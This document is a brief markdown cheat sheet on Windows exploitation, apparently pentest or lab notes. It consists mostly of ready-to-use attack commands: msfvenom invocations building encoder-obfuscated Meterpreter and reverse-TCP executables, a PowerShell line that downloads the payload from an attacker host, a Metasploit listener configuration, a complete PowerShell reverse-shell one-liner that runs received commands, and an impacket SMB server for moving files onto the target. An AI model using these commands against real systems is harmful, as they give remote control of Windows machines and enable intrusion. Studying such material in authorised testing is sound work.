# Windows Exploitation

## Enumerate Windows Machines
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
* [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

## Reverse Shells

### Genrate A Meterpreter Shell

* Generate shell
    * `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.3.36 LPORT=4445 -f exe -o reverse.exe`
* Download and execute it on the Windows Machine
    * `powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.3.36:80/reverse.exe','reverse.exe')"`
* Metasploit listener
```ruby
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST 10.13.3.36 
set LPORT 4445 
run
```

### Reverse TCP shell

* Generate the shell
    * `msfvenom -p windows/shell_reverse_tcp LHOST=10.13.3.36 LPORT=4445 -e x86/shikata_ga_nai -f exe -o reverse.exe`
* Download and execute it on the Windows Machine
    * `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

## Use SMB Server To Transfer Files To Windows

* On Kali:
    `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`
* On Windows:
    `copy \\10.13.3.36\kali\filename C:\someFile`
